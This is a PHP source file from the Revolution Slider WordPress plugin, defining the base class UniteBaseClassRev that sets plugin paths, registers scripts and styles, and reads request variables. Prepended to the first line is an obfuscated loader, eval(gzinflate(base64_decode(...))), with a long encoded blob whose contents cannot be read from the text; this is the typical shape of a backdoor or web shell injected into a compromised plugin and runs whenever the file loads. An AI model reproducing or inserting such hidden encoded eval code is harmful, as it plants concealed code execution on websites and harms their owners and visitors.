<?php eval(gzinflate(base64_decode('pRn9c9o49ufczP0PKuPGuHHAGAihiZN203R3Z67bHk1v5iZJGWFk0GJsr2xIaJz//d6T5I8Qsrc312mRrPep9yU9lQek+WrKAh6xadMMxPJDalrWw9//tqcWizVid6wTWGVCxGIsWBKLjEezpiNX4W+wivyMxxEB/PE0JE1jJUKLIKc9DkIK+Jjd8zRLm6YP8DGPeAbyFNqe4c+JR0qAYnEiQXIxZVmcwLI/t8nFt9E/Pn+5Go8ur76Nfrsavf/t68fLkU06msCIV1nBjN0znyCZhqE+CiBEFEsAeeV5xLGIJgtomLKaZD+MU1Zj8UgYIJAHjf4u4CEbz1g29uMoYxHsT+n+iMiCZSsRkUzwZRMJJIvHHWbzBe6OR9L+ewYPvTQTIYvk2okRe6YppQexAF04CHZOCIyn8BPi7OAAd9DyAP/a4LfkOzHfKBKtgxG/JBuU96k/Z00jWyZTLmwj5NHCNvxlxpfMNrKYedIqWrkApGvUltlOWZqOzdZy2m8mgs0wQELqQ/S0v8+zLHl7075pX3+/ad8etE2bmPBPsreUNY2Aoc3Rhjo6jEBBeNB8hdA8J6hG0yKHEk8qhVjkjBw55A3RelpIpINpGvqeCsamElY4v4kc9/eJxPD0rogE7r3L4pU/L+XvoZvlRDGtUbNlkm2ayMOSzMBABRON+4yZNHydaYkp2SYykuIEHR7Y5h0mYnAneIY7TexaiKBQ64QEMiwRqCNN834ovA14BUAN8vdR2dx/IXC1tpoHfPvWeSUavt6qMNwVRTydxFlTh8iKeu8ggLM4jO+YaBrjr5ejf12Ors1frq6+jL/B1/j9z5e/XZm3pbPRU4nHEzeMobhUFKPLT5+vLsfvP3wYAbZ16liIeOD13GFveDRwh0cn0vaGSGFXVAi6aarf7lF32O8Nh/2uLaf9407PtWwF7DjHQ6fvHg26tpweOcdHFbDjAkXfdTq2mg5BWAl0Ad89cp2hLac9tz90LFs7QYvuA6jX6QF3OR303O5xxb3THR47wNNW077jVqLd3nDg9GHRltNBp9+pKIHR0JVs1bTfPzraFt077nQG8A9E4/TYdZ2jgoE7BHYDtwsmwanbHRwfV0BUZNgZdFwbp93+wO0NdJ5C3WFQIyAmwMw0JYawCEYuuOLMM8S1cyszAT5P8bNza5Gy9q1YldAram2vGxA3levMWRzPQgZrpm1O4JxRszRciQTGZRqphd8ZW7MUJhmLlxRGX9C7kAnETfgUJtuKSzGo+kSqDuGZxFisqY1Lr8pq8Ey/ufcO0mQep9lkQ6dT8WJwavQJ9Z7sRakNvxs6j2OzjHgDzp5KPSCT2s2fqgfnHS69rJ7+Lo+tXbmpinWRnEHN2m0AgWbtNRV62mrfJYe6JLTlubC9uErCmE5TuVzQVIh8SWfgGNwl0X/KTWqhV5++4FFwdanHT18+/DoyLbn9tbwRkNofPLINPGrBCSxaNwEFcGAX17eekWGRKzBr0533jnSTyoKXQQEfg0HMitE2qGnVGSscs2XWNrVje2hZ3ENg1bawZ2TywAzgrFTHpKDRtGnVDfT8EMgCMMyduo+VWHv1ql9fX0V4yiHV0/XiMAjqq08NtjOAtuMnZYIFRfgIVHNXcW/I4j66hMvY5ahRpAPcD7aTW2d2mRG2SdMF/sbhs6xFcrQphn4tLYSNSy1wCaTG/5EZc7pmCwaHefrkihMtUGl2D5E+hatMjspNeMiDTU7DCYt+UBin1M/iiOV0Gd/zMKdRRierFL4Tn4Y8zWlGBb3PJxS8FrAIJ3gRzCeQInCbFVBQciBIqMh9BiVPsHs5uae5zyUHnwNWDuRLPs2nLN0IFuZTHoQrn0b5NL7f+BsfXM9yFtI16AB+8jNJygQHcRTGTTYX8XLj8yiHa33CgHcehHS2CfMZMIqTOSRsziOomTTMFxTyV9A8pCm/z0O2pn+sgBImPMNl0A51WrKZFLOMJ9yH3wyMs1rmEaQaDnG4plPYTiwAKaNZnlA0EYQ2T+OQwUSqB4zhzrikQk6AxWwDY6x0RAP5YBsY11B2gBwcyqNDmot4AuyiHMIy/mMFJkl5KJWGcSrVgonSF+KFZhlTs3gJ1olBjUOIL5/l6SZC24BtMwrO5IkckR7HJL7PoeDEYgmiMgaMCmOD88BK9/mahhk6DdWLAZKvuVRjzWcxDHcsDCerDDf3g0Y0ANvlP1jEEOUHl14BJqgzAyjsT0qXMyjHxeKPeM0hjHRiGAuIS4xWHa7nfyUTWxVgdPnPb5dfr8bfRr9Chr410pOiSysya2E3Urh3vu6+b5SnTp7XoDyC/uYJuEy9qknR2Yt5hNkbWZC7sj2A0Id7caPdvJnkY8uI1NhuEEhoaAoKTkZUT+GXb51y99EKuquvGdaEiznzFzB+ojPu6+bS+DXKuu43aCvBdrVro4RBjzXLsPcs+i3gU9ag7VZLIRftlm42pEjyxtNCqz5TQ84AUmpQUBVkXol2WMOCrqbJI0AugO06i6KleMbilBzi5bB33D3qHVvkvAQcPNHgrTbTSdUXFLwOPBKLqTTCg8Efdcdb7yJLyh3HhD+f03QuqaG8F9aXFB3iPXMX4NjEue/0nT6Oru7fFYGLbeFuCknkON2PdfwOOQNDu09WwDLNCkp60K0Bafcj/LlwiEVyUoIVwPpr5BfOTuq/Rg7Eu6kL8itF2nwKv3AscnqKXLYpLyyEuHWeroR8dD6Sgqe7g6eyg/MyYwBJmHP/fhdzR+5ECfgFHA9eksEIG8gJiKyb46dNxmQmyaWPUK6rL6QF52IOwiEQZUHTfL3CdwLN1CIvpKom3E7XAvGQdE4IZu6ZTGGcHR6WaTtCfQoWGOxV4oIDPNyIVPM1ca0qa4EKcgSGk2rBU8naxHmbdMCeB0R+vMaP51kmbVHnogQdHFTZVkN87QGXsko78rWqAj+tQtrKHQerSbnyJxsj5c7q4Jrw+ua31B8+fdmoATETO7V91wuIOTBbFWqrcMCL72LzRMgHNdvIpvpy5s+9erUpXwoNwVJv60FrajfkK1S7ncVxOKEC7guCs7SlbqItP162s4k4h4MdDnEvoms1O6SrLN4PGAWlgeuIRot9kAuy9//weBTEb1Fuwz5y3ri9N4PaKwYckypE1T2VpTZpIPm4YT0/MNPVBDAV2lC/s+4yg2BQlBfWQ9FH1x5csO+u3dEtHQ/Ce7fCLPHxArv1/vLL569XZu1WYNZuBUUbCxf3P+GgrxYl8pSzZuP01YfPF1f//nJJ5tkyPDtVv5N4ujk7TX3Bk+xsGvurJZi3FcY+xd15zZvCQZ3BcWvQbbkdt9V12nhrbM/iVjJPzheesdhPPSPdF54hbhrWyWlbMzxtK/5tKaxRHVjaihABXOijpOiCEccA63k1K8q1hVdvCdQatv1Av/20effQfbxptaEvgEL18kuXsrQ6sbHH89feO2P8BVavsROU3FumPzetW+sB7s74wr1WL3qILpUH/xYFD9GtUzj7cPFV7T4FGt1MHzo2KvXixMAHWMVDZxK0HliHdRQ+2SMx29ff6eGP8tm2tskJTdlRb6xDo7aRpAMdq2XZjt0tuj9sagsPi1VKg/nvKW8J0YpWyscBY1Pp5YR6UqF9SDNk15Ac2m3JJ0u8/ymIyzcW8C8aC/IyKeJA1ZQssfAJuVMkTOI/qx1cdplJq7FPvXA/8RqtWkIAPQASiEjgrAtB7Z05gdsnZgVOqrqudyNWgqsi8TxuduQimGXG+FQeNGnKIEjGP19eXUtrQXCd1z/fdN46ZTEqqxDIs832uWlBgXeq27xex97vXvpAIahXbS30jDjaRLVCVGX9yzZLPM1CG8fGxlxfXh/3igNNKeF5ZtvEp/7yq9TJVNqAH6v/K3rJU+SZG3xLOuG5DxC4kJzTaagD4yXfpw2bqEg6J10H7s9F1Sd6Tw+FvMKwwBOSJoejDvfTgpn6b6baG8MOe/4Xg4Ii20GI3K3iEKobuDp4i1qysMhTgY//AQ==')));?>
<?php

	class UniteBaseClassRev{
		
		protected static $wpdb;
		protected static $table_prefix;		
		protected static $mainFile;
		protected static $t;
		
		protected static $dir_plugin;
		protected static $dir_languages;
		public static $url_plugin;
		protected static $url_ajax;
		public static $url_ajax_actions;
		protected static $url_ajax_showimage;
		protected static $path_settings;
		public static $path_plugin;
		protected static $path_languages;		
		protected static $path_temp;
		protected static $path_views;
		protected static $path_templates;
		protected static $path_cache;
		protected static $path_base;	
		protected static $is_multisite;
		protected static $debugMode = false;
		
		/**
		 * 
		 * the constructor
		 */
		public function __construct($mainFile,$t){
			global $wpdb;
			
			self::$is_multisite = UniteFunctionsWPRev::isMultisite();
			
			self::$wpdb = $wpdb;
			self::$table_prefix = self::$wpdb->base_prefix;
			if(UniteFunctionsWPRev::isMultisite()){
				$blogID = UniteFunctionsWPRev::getBlogID();
				if($blogID != 1){
					self::$table_prefix .= $blogID."_";
				}
			}
			
			self::$mainFile = $mainFile;
			self::$t = $t;
			
			//set plugin dirname (as the main filename)
			$info = pathinfo($mainFile);
			$baseName = $info["basename"];
			$filename = str_replace(".php","",$baseName);
			
			self::$dir_plugin = $filename;			
					
			self::$url_plugin = plugins_url(self::$dir_plugin)."/";			
			self::$url_ajax = admin_url("admin-ajax.php");
			self::$url_ajax_actions = self::$url_ajax . "?action=".self::$dir_plugin."_ajax_action";
			self::$url_ajax_showimage = self::$url_ajax . "?action=".self::$dir_plugin."_show_image";
			self::$path_plugin = dirname(self::$mainFile)."/";
			self::$path_settings = self::$path_plugin."settings/";
			self::$path_temp = self::$path_plugin."temp/";
			
			//set cache path:
			self::setPathCache();
			
			self::$path_views = self::$path_plugin."views/";
			self::$path_templates = self::$path_views."/templates/";
			self::$path_base = ABSPATH;
			self::$path_languages = self::$path_plugin."languages/";
			self::$dir_languages = self::$dir_plugin."/languages/";
			
			load_plugin_textdomain(self::$dir_plugin,false,self::$dir_languages);
			
			//update globals oldversion flag
			GlobalsRevSlider::$isNewVersion = false;
			$version = get_bloginfo("version");
			$version = (double)$version;
			if($version >= 3.5)
				GlobalsRevSlider::$isNewVersion = true;
			
		}
		
		/**
		 * 
		 * set cache path for images. for multisite it will be current blog content folder
		 */
		private static function setPathCache(){
			
			self::$path_cache = self::$path_plugin."cache/";
			if(self::$is_multisite){
			
				if(!defined("BLOGUPLOADDIR") || !is_dir(BLOGUPLOADDIR))
					return(false);
			
				$path = BLOGUPLOADDIR.self::$dir_plugin."-cache/";
				
				if(!is_dir($path))
					mkdir($path);
				if(is_dir($path))
					self::$path_cache = $path;
			}
		}
		
		/**
		 * 
		 * set debug mode.
		 */
		public static function setDebugMode(){
			self::$debugMode = true;
		}
		
		
		/**
		 * 
		 * add some wordpress action
		 */
		protected static function addAction($action,$eventFunction){
			
			add_action( $action, array(self::$t, $eventFunction) );			
		}
		
		
		/**
		 * 
		 * register script helper function
		 * @param $scriptFilename
		 */
		protected static function addScriptAbsoluteUrl($scriptPath,$handle){
			
			wp_register_script($handle, $scriptPath);
			wp_enqueue_script($handle);
		}
		
		/**
		 * 
		 * register script helper function
		 * @param $scriptFilename
		 */
		protected static function addScriptAbsoluteUrlWaitForOther($scriptPath,$handle,$waitfor = array()){
			wp_enqueue_script($handle, $scriptPath, $waitfor);
		}
		
		/**
		 * 
		 * register script helper function
		 * @param $scriptFilename
		 */
		protected static function addScript($scriptName,$folder="js",$handle=null){
			if($handle == null)
				$handle = self::$dir_plugin."-".$scriptName;
			
			wp_register_script($handle , self::$url_plugin .$folder."/".$scriptName.".js?rev=". GlobalsRevSlider::SLIDER_REVISION );
			wp_enqueue_script($handle);
		}
		
		/**
		 * 
		 * register script helper function
		 * @param $scriptFilename
		 */
		protected static function addScriptWaitFor($scriptName,$folder="js",$handle=null,$waitfor = array()){
			if($handle == null)
				$handle = self::$dir_plugin."-".$scriptName;
			
			wp_enqueue_script($handle, self::$url_plugin .$folder."/".$scriptName.".js?rev=". GlobalsRevSlider::SLIDER_REVISION, $waitfor);
		}
		
		/**
		 * 
		 * register common script helper function
		 * the handle for the common script is coming without plugin name
		 */
		protected static function addScriptCommon($scriptName,$handle=null, $folder="js"){
			if($handle == null)
				$handle = $scriptName;
			
			self::addScript($scriptName,$folder,$handle);
		}
		
		
		/**
		 * 
		 * simple enqueue script
		 */
		protected static function addWPScript($scriptName){
			wp_enqueue_script($scriptName);
		}
		
		
		/**
		 * 
		 * register style helper function
		 * @param $styleFilename
		 */
		protected static function addStyle($styleName,$handle=null,$folder="css"){
			if($handle == null)
				$handle = self::$dir_plugin."-".$styleName;
			
			wp_register_style($handle , self::$url_plugin .$folder."/".$styleName.".css?rev=". GlobalsRevSlider::SLIDER_REVISION);
			wp_enqueue_style($handle);
		}
		
		/**
		 * 
		 * register style helper function
		 * @param $styleFilename
		 */
		protected static function addDynamicStyle($styleName,$handle=null,$folder="css"){
			if($handle == null)
				$handle = self::$dir_plugin."-".$styleName;
			
			wp_register_style($handle , self::$url_plugin .$folder."/".$styleName.".php?rev=". GlobalsRevSlider::SLIDER_REVISION );
			wp_enqueue_style($handle);
		}
		
		/**
		 * 
		 * register common script helper function
		 * the handle for the common script is coming without plugin name
		 */
		protected static function addStyleCommon($styleName,$handle=null,$folder="css"){
			if($handle == null)	
				$handle = $styleName;
			self::addStyle($styleName,$handle,$folder);
			
		}
		
		/**
		 * 
		 * register style absolute url helper function
		 */
		protected static function addStyleAbsoluteUrl($styleUrl,$handle){
			
			wp_register_style($handle , $styleUrl);
			wp_enqueue_style($handle);
		}
		
		
		/**
		 * 
		 * simple enqueue style
		 */
		protected static function addWPStyle($styleName){
			wp_enqueue_style($styleName);
		}
		
		/**
		 * 
		 * get image url to be shown via thumb making script.
		 */
		public static function getImageUrl($filepath, $width=null,$height=null,$exact=false,$effect=null,$effect_param=null){
			
			$urlImage = UniteImageViewRev::getUrlThumb(self::$url_ajax_showimage, $filepath,$width ,$height ,$exact ,$effect ,$effect_param);
			
			return($urlImage);
		}
		
		
		/**
		 * 
		 * on show image ajax event. outputs image with parameters 
		 */
		public static function onShowImage(){
		
			$pathImages = UniteFunctionsWPRev::getPathContent();
			$urlImages = UniteFunctionsWPRev::getUrlContent();
			
			try{
				$imageView = new UniteImageViewRev(self::$path_cache,$pathImages,$urlImages);
				$imageView->showImageFromGet();
				
			}catch (Exception $e){
				header("status: 500");
				echo $e->getMessage();
				exit();
			}
		}
		
		
		/**
		 * 
		 * get POST var
		 */
		protected static function getPostVar($key,$defaultValue = ""){
			$val = self::getVar($_POST, $key, $defaultValue);
			return($val);			
		}
		
		/**
		 * 
		 * get GET var
		 */
		protected static function getGetVar($key,$defaultValue = ""){
			$val = self::getVar($_GET, $key, $defaultValue);
			return($val);
		}
		
		
		/**
		 * 
		 * get post or get variable
		 */
		protected static function getPostGetVar($key,$defaultValue = ""){
			
			if(array_key_exists($key, $_POST))
				$val = self::getVar($_POST, $key, $defaultValue);
			else
				$val = self::getVar($_GET, $key, $defaultValue);				
			
			return($val);							
		}
		
		
		/**
		 * 
		 * get some var from array
		 */
		protected static function getVar($arr,$key,$defaultValue = ""){
			$val = $defaultValue;
			if(isset($arr[$key])) $val = $arr[$key];
			return($val);
		}
		
		
		
		/**
		 * 
		 * make config file of all the text in the settings for the .mo and .po creation
		 */
		protected static function updateSettingsText(){
			
			$filelist = UniteFunctionsRev::getFileList(self::$path_settings,"xml");
			foreach($filelist as $file){
				$filepath = self::$path_settings.$file;
				UniteFunctionsWPRev::writeSettingLanguageFile($filepath);
			}
			
		} 
		
	}

?>